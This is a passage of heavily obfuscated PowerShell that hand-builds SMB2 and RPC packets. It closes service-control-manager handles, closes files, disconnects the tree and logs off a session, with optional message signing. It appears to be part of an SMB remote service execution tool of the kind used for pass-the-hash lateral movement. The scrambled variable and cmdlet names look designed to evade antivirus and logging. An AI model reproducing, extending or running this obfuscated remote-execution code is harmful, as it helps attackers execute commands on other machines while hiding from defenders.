                            ${pa`cK`Et_sC`M_`DATA} = &("{1}{3}{2}{0}{5}{4}{6}{7}" -f'CMC','Get-','acketS','P','erv','loseS','iceHand','le') ${smb_`SE`Rvi`CE`_coNTEX`T_haN`dlE}
                        }
                        else
                        {
                            ${smB`2`_`Me`sSAge_Id}++
                            ${S`Mb`_`cLiEN`T_`StAGe} = ("{3}{0}{1}{2}"-f 'oseR','equ','est','Cl')
                            ${PAC`keT`_s`Cm`_daTa} = &("{3}{2}{1}{5}{0}{7}{6}{4}" -f 'e','PacketSCMClo','et-','G','andle','s','iceH','Serv') ${sM`B`_sER`V`icE_Manag`eR`_CoN`TeXT_hA`ND`LE}
                        }

                        ${PA`ck`et_SmB`2_h`eAder} = &("{1}{2}{0}{3}"-f'PacketSM','Ge','t-','B2Header') 0x09,0x00 ${SMb2_`ME`sS`Ag`e_iD} ${S`mB2_T`RE`E_id} ${s`mb_Se`SsION_iD}
                        ${pAC`kET`_sMb2`_HeadeR}[("{0}{2}{3}{4}{1}" -f 'SMB2H','itRequest','ead','er','_Cred')] = 0x7f,0x00
                    
                        if(${sMB`_SI`gnInG})
                        {
                            ${pa`cKet`_s`MB`2`_HEADer}[("{0}{2}{1}{3}"-f 'SMB2','Fla','Header_','gs')] = 0x08,0x00,0x00,0x00      
                        }

                        ${S`C`M_`DaTA} = &("{5}{2}{0}{4}{1}{6}{3}" -f'-PacketOrd','d','rom','tionary','ere','ConvertF','Dic') ${pacK`ET`_scM_dA`Ta}
                        ${P`A`Cket_rpc_`data} = &("{3}{1}{0}{4}{2}"-f'-P','et','est','G','acketRPCRequ') 0x03 ${sc`m_Data}."len`Gth" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${r`PC_`DaTa} = &("{6}{1}{5}{3}{4}{2}{0}" -f 'nary','vertFro','dDictio','-PacketOrde','re','m','Con') ${pac`Ket_`RPC_DA`TA} 
                        ${PAcKeT`_`Smb2`_`Da`TA} = &("{3}{2}{4}{0}{1}{5}" -f'W','riteRe','PacketSM','Get-','B2','quest') ${sMB_`FI`lE_Id} (${rP`c_`dATA}."LEn`GtH" + ${s`cM_dAtA}."le`NgtH")     
                        ${SmB2_`hEAD`er} = &("{2}{5}{6}{3}{0}{8}{7}{4}{1}{9}" -f'et','cti','Conver','ck','redDi','t','From-Pa','e','Ord','onary') ${p`ACKe`T_sM`B2_h`EAd`ER}
                        ${s`MB2_D`AtA} = &("{9}{1}{4}{6}{8}{2}{5}{7}{3}{0}"-f'nary','rtFro','k','ctio','m','etO','-Pa','rderedDi','c','Conve') ${pa`cKet`_Smb2_Da`Ta} 
                        ${RP`c`_d`A`Ta_length} = ${Sm`B`2_d`Ata}."L`ength" + ${ScM`_d`ATa}."l`E`NgtH" + ${rpC`_DA`TA}."LEn`gtH"
                        ${p`A`cket_n`EtbIoS_S`eSSIo`N_ServI`ce} = &("{7}{5}{0}{3}{2}{6}{1}{4}"-f't-Pa','nServi','ketNetB','c','ce','e','IOSSessio','G') ${S`mb`2_`HEadEr}."LEn`GtH" ${rpc`_`DAtA_lE`N`GTh}
                        ${N`E`Tbi`Os_SessI`o`N_sERVi`ce} = &("{3}{4}{5}{2}{6}{1}{0}"-f'ictionary','etOrderedD','m-Pa','C','onve','rtFro','ck') ${PAcKE`T_NeTBIOs`_`SesSIoN`_servI`cE}

                        if(${sMB`_siGnI`NG})
                        {
                            ${Sm`B`2_sIGN} = ${SMB`2_he`Ad`eR} + ${SmB2`_D`ATa} + ${r`Pc_d`ATa} + ${S`Cm_`daTA}
                            ${s`MB2_`S`iGNa`TurE} = ${HmAc_sH`A`2`56}."C`O`mPUTehasH"(${S`mb2_si`gn})
                            ${smb2_S`i`GNATu`Re} = ${s`mB2`_siG`NATUre}[0..15]
                            ${pAckE`T_SMb2`_HeAD`eR}[("{0}{1}{3}{2}" -f'SMB2He','ader','ure','_Signat')] = ${Smb2_`SIgnA`TUrE}
                            ${sM`B2_h`EaD`Er} = &("{8}{2}{0}{6}{3}{4}{1}{5}{10}{9}{7}"-f 'v','eredDicti','on','ket','Ord','on','ertFrom-Pac','y','C','r','a') ${pa`cKet`_Smb`2_`HEADEr}
                        }

                        ${sM`B`_ClIenT_se`Nd} = ${Ne`Tbi`oS_`Session_S`eR`Vi`ce} + ${SMB`2_HE`AD`Er} + ${smb2_`da`Ta} + ${R`p`c_DaTa} + ${scM`_d`ATA}
                        ${SMB`_Cl`IEn`T_STReam}.("{0}{1}"-f'Wri','te').Invoke(${sMb_ClIe`Nt_`SEnd},0,${s`Mb_`CLI`en`T_SEnD}."lE`NgtH") > ${n`ULL}
                        ${SMb`_cliEnT`_s`Tre`AM}.("{0}{1}" -f 'Flus','h').Invoke()
                        ${sMB`_cliEnT_s`Tr`eAm}.("{1}{0}"-f'ead','R').Invoke(${SM`B_cLie`Nt`_ReCeivE},0,${s`Mb_`CLiEn`T_`ReCEI`VE}."lENg`TH") > ${nu`LL}
                    }

                    ("{0}{1}{2}"-f'Cl','oseReque','st')
                    {
                        ${Smb2`_mEs`sag`E_`id} += 20
                        ${pAck`ET_S`MB2_H`EaD`eR} = &("{1}{0}{4}{5}{3}{2}" -f'et-Pac','G','er','d','ketSMB2','Hea') 0x06,0x00 ${s`m`B2_MESS`A`Ge_ID} ${SMB2_tree`_`id} ${SM`B_`S`ess`iOn_iD}
                        ${Pa`CkE`T`_SMb2_hEADER}[("{0}{3}{2}{4}{6}{5}{1}" -f 'SMB','t','it','2Header_Cred','R','ques','e')] = 0x7f,0x00
                    
                        if(${Smb_`S`IG`NIng})
                        {
                            ${pAc`Ke`T`_SM`B2_HeAdER}[("{1}{4}{0}{3}{2}"-f '_F','SM','gs','la','B2Header')] = 0x08,0x00,0x00,0x00      
                        }
      
                        ${pac`k`ET_`S`mb`2_dAtA} = &("{1}{0}{5}{4}{2}{3}"-f 'a','Get-P','seReques','t','MB2Clo','cketS') ${sm`B_`F`iLe_Id}
                        ${Sm`B2_Hea`DeR} = &("{6}{3}{2}{7}{5}{4}{1}{0}"-f'tionary','redDic','t','onver','PacketOrde','rom-','C','F') ${P`A`CKE`T`_sMb`2_Hea`dEr}
                        ${Smb`2_`DaTa} = &("{4}{6}{3}{1}{5}{0}{2}" -f'o','ere','nary','Ord','Conver','dDicti','tFrom-Packet') ${pACK`e`T_`s`MB2_dA`Ta}
                        ${pACkEt_n`eTb`I`Os_SEssio`N_s`E`RVICe} = &("{4}{5}{7}{6}{3}{1}{9}{2}{8}{0}"-f 'e','io','rv','OSSess','Get','-P','ketNetBI','ac','ic','nSe') ${S`mb2_`hE`AdER}."lE`NGth" ${s`Mb`2_DAta}."len`Gth"
                        ${NEtB`I`oS`_seSsION`_SeRV`ICE} = &("{2}{0}{6}{5}{4}{1}{3}" -f'onver','na','C','ry','ictio','ketOrderedD','tFrom-Pac') ${p`AcKEt_net`BIOS`_SEssI`o`N`_s`ErVIce}

                        if(${S`MB_sIG`NinG})
                        {
                            ${SMB`2_S`IGN} = ${sM`B2_H`E`ADer} + ${SMB2_`dA`Ta}
                            ${SMB2`_SI`GNAtU`RE} = ${hm`Ac_`Sh`A256}."coMpute`h`ASh"(${SMB2_s`i`gn})
                            ${SM`B`2_SIgNAtu`RE} = ${SmB2_SiGNa`T`U`RE}[0..15]
                            ${PaCk`e`T_SmB2_`hEaDEr}[("{1}{4}{3}{2}{0}{5}"-f'natu','SM','der_Sig','ea','B2H','re')] = ${SmB2_sI`gNAtu`RE}
                            ${sMb`2_`He`ADeR} = &("{5}{3}{2}{7}{0}{6}{4}{1}"-f'ack','ctionary','r','nve','redDi','Co','etOrde','tFrom-P') ${paCk`et_sM`B`2_HEA`dER}
                        }

                        ${SM`B_ClIe`Nt`_send} = ${neTbIOS`_Se`s`sioN_`SeRVI`ce} + ${SmB`2_h`eADER} + ${S`MB2_`D`ATA}
                        ${smB_CLI`e`N`T_st`ReaM}.("{1}{0}"-f 'e','Writ').Invoke(${smB_`c`L`Ient_`sEND},0,${smB_CLIEn`T_s`e`Nd}."Le`NgtH") > ${n`ULL}
                        ${Smb_cL`Ie`N`T_strEAm}.("{1}{0}"-f'lush','F').Invoke()
                        ${Smb_Cl`I`E`N`T_StrEAM}.("{1}{0}"-f 'd','Rea').Invoke(${s`mb_cLIent_`R`ecEIVe},0,${s`M`B_cLieN`T_`RECe`iVe}."Le`NgTh") > ${NU`LL}
                        ${sm`B_CLient`_S`Tage} = ("{1}{2}{3}{0}"-f 't','Tree','D','isconnec')
                    }

                    ("{2}{3}{0}{1}"-f 'isconn','ect','Tre','eD')
                    {
                        ${S`M`B2_me`sSAGe_id}++
                        ${P`AckE`T_s`MB2_H`Eader} = &("{1}{3}{2}{0}{4}"-f 'etS','G','k','et-Pac','MB2Header') 0x04,0x00 ${SmB2`_ME`SSaGe_`iD} ${SM`B2_`TreE_`iD} ${Sm`B_`s`ESSIO`N_iD}
                        ${PA`CkeT_`sM`B`2_He`ADer}[("{0}{2}{4}{3}{1}{5}{6}"-f 'SMB2Header_Cre','q','d','e','itR','ue','st')] = 0x7f,0x00
                    
                        if(${s`mB_si`gni`Ng})
                        {
                            ${pAC`Ke`T_S`M`B2_H`eadER}[("{2}{1}{0}"-f's','Flag','SMB2Header_')] = 0x08,0x00,0x00,0x00      
                        }
          
                        ${P`ACKE`T_SmB`2_d`AtA} = &("{8}{4}{5}{3}{0}{6}{7}{2}{1}"-f'B2','nectRequest','on','ketSM','-','Pac','Tree','Disc','Get')
                        ${SMB`2_HeA`D`ER} = &("{0}{6}{2}{8}{5}{3}{7}{1}{4}" -f'C','t','rtF','cke','ionary','om-Pa','onve','tOrderedDic','r') ${pa`C`K`eT_`sMB`2`_HeAdER}
                        ${Smb`2_D`Ata} = &("{3}{2}{4}{5}{1}{0}{6}"-f 'e','etOrd','nver','Co','tFrom-Pa','ck','redDictionary') ${Pac`keT_sm`B2`_DatA}
                        ${paC`k`eT_NeTbI`OS_SES`s`iOn_servICE} = &("{7}{0}{2}{3}{6}{4}{9}{1}{8}{5}" -f'acketNe','o','tBIOS','Se','s','Service','s','Get-P','n','i') ${sMb`2`_H`eAdeR}."leNG`Th" ${s`m`B2`_DaTA}."L`E`NGth"
                        ${NEtbIoS_`seSS`IO`N_SeR`V`IcE} = &("{3}{0}{2}{4}{5}{1}" -f 'nve','ketOrderedDictionary','rt','Co','From-','Pac') ${packET`_n`e`TB`IoS`_SEss`i`on_SERVicE}

                        if(${S`MB`_siGn`Ing})
                        {
                            ${S`mb`2_siGN} = ${s`Mb2_`HEadER} + ${SMB`2_`dATA}
                            ${smb`2_`signaT`URE} = ${hM`Ac_S`HA256}."cOMpu`T`Eh`ASH"(${sMB`2_SI`gn})
                            ${Smb2_sI`g`N`AtUre} = ${sM`B2_`S`IgNAtUrE}[0..15]
                            ${pA`ck`et_S`M`B2_He`Ader}[("{5}{3}{2}{1}{0}{4}"-f'Signa','ader_','e','2H','ture','SMB')] = ${SMb2`_si`GNATu`RE}
                            ${SM`B2_`he`AdEr} = &("{2}{3}{1}{8}{6}{9}{0}{7}{5}{4}" -f'Dict','tFrom-Pa','Conv','er','ry','a','e','ion','cketOrder','d') ${pa`Cket`_`s`mB2_hEADer}
                        }

                        ${s`mb_`clieNT_`SEND} = ${nEtbi`os_se`Ss`Io`N`_SERVicE} + ${smb2`_HEA`DEr} + ${S`mB2_Da`Ta}
                        ${SM`B_CLIE`NT_`stREAM}.("{1}{0}" -f'e','Writ').Invoke(${smb`_c`liEn`T_SEnd},0,${S`MB_cLIe`NT_`s`end}."LE`NG`Th") > ${nU`Ll}
                        ${Smb`_`C`LiENt_sTREAM}.("{1}{0}" -f'h','Flus').Invoke()
                        ${SMb_CLi`e`Nt_st`REAm}.("{1}{0}" -f 'd','Rea').Invoke(${SmB_`c`Li`eNT_Re`cEI`Ve},0,${smB_`CLI`e`Nt_r`ecEIVe}."len`GtH") > ${N`ULL}
                        ${SMB`_c`lIen`T`_`STAge} = ("{0}{2}{1}" -f 'Lo','f','gof')
                    }

                    ("{0}{1}" -f'Logo','ff')
                    {
                        ${sm`B2_`Me`ss`AgE_ID} += 20
                        ${pAc`ke`T`_SMB`2_H`eADER} = &("{0}{1}{2}{4}{3}" -f 'Get-PacketS','MB','2','ader','He') 0x02,0x00 ${Sm`B`2_`MesSA`ge_ID} ${smb2_t`RE`E`_`Id} ${s`Mb_SESSi`o`N_`id}
                        ${P`ACkeT_`sMB2_`H`eaDer}[("{4}{5}{3}{2}{1}{0}"-f'tRequest','redi','r_C','e','SMB2He','ad')] = 0x7f,0x00
                    
                        if(${SMB`_`SigNi`Ng})
                        {
                            ${PackET_s`Mb`2_`he`A`Der}[("{3}{0}{4}{2}{1}" -f'Header','s','ag','SMB2','_Fl')] = 0x08,0x00,0x00,0x00      
                        }
         
                        ${P`ACkEt_sMB`2_`dA`Ta} = &("{2}{5}{4}{3}{1}{0}{6}"-f 'gof','o','Get-Packet','nL','MB2Sessio','S','fRequest')
                        ${SMb2_H`ead`ER} = &("{7}{4}{6}{5}{1}{2}{0}{3}"-f'nar','et','OrderedDictio','y','ert','k','From-Pac','Conv') ${p`Ack`eT_s`MB2_HeaD`ER}
                        ${sMb`2`_`dATA} = &("{4}{0}{7}{5}{3}{1}{2}{9}{6}{8}"-f 'nvertFrom','OrderedDi','ct','ket','Co','ac','a','-P','ry','ion') ${PaCke`T_s`MB2`_`daTA}
                        ${PaCKET`_nE`T`B`iOS_SeS`sIo`N_Se`Rv`ICe} = &("{2}{1}{8}{7}{5}{0}{6}{3}{4}" -f 'ession','t','Get-Packe','c','e','SS','Servi','etBIO','N') ${S`mB2_HE`AD`ER}."le`NgTH" ${SMb2`_D`Ata}."lEn`Gth"
                        ${N`Et`BIos_S`eSSion_`S`eR`ViCe} = &("{6}{1}{3}{2}{4}{5}{7}{8}{0}" -f 'y','ver','From-','t','PacketOrde','r','Con','e','dDictionar') ${pAcKE`T_`NEt`B`ioS_SEssIoN_SE`RVICe}

                        if(${s`Mb`_Si`gNiNg})
                        {
                            ${Sm`B2_`s`ign} = ${s`Mb2`_hEadEr} + ${sM`B`2_DATA}
                            ${S`MB2_`Sig`Na`TuRe} = ${Hm`AC`_sHa2`56}."cOMpuTeh`A`SH"(${SMB`2`_`sIGN})
                            ${S`MB2`_S`iGNatu`RE} = ${smB2`_s`igNATU`Re}[0..15]
                            ${pA`ckET`_S`Mb2_hE`A`DER}[("{3}{4}{0}{1}{2}"-f'Signa','t','ure','SMB2H','eader_')] = ${SMB2_`SIgn`AtuRE}
                            ${Sm`B2`_He`ADeR} = &("{3}{6}{1}{0}{2}{5}{4}" -f 'rderedD','cketO','i','Conve','nary','ctio','rtFrom-Pa') ${paCKET_`S`mB`2_HeaDer}
                        }

                        ${sMB_`cLI`en`T_S`end} = ${n`Etb`ios_S`ESsiO`N`_sErVI`CE} + ${sMb2`_`heA`dER} + ${S`MB2`_da`Ta}
                        ${sMb_CLIE`N`T`_s`TR`Eam}.("{1}{0}"-f 'e','Writ').Invoke(${sm`B_clI`E`Nt_sEND},0,${sM`B_cl`IEnT_SenD}."le`NGTH") > ${N`ULL}
                        ${s`mb_cliE`Nt_st`R`EAm}.("{1}{0}"-f 'ush','Fl').Invoke()
                        ${SmB_CliE`N`T`_ST`R`EAM}.("{0}{1}" -f 'R','ead').Invoke(${SMB_`CLieNt_R`E`Ce`IvE},0,${S`mB`_`ClieNt_RE`CeI`VE}."LEN`G`Th") > ${NU`ll}
                        ${Smb`_C`L`ieNT_`StAGe} = ("{1}{0}"-f'xit','E')
                    }

                }
                
                if(${sM`BeXEc`_FAI`LeD})
                {
                    BREAK ("{1}{3}{2}{0}{4}" -f 'te_lo','SMB_e','cu','xe','op')
                }
            
            }

        }

    }

    ${S`Mb_`cliENT}.("{1}{0}"-f 'lose','C').Invoke()
    ${sm`B_c`L`ie`Nt_`sTreaM}.("{0}{1}"-f'C','lose').Invoke()
}

}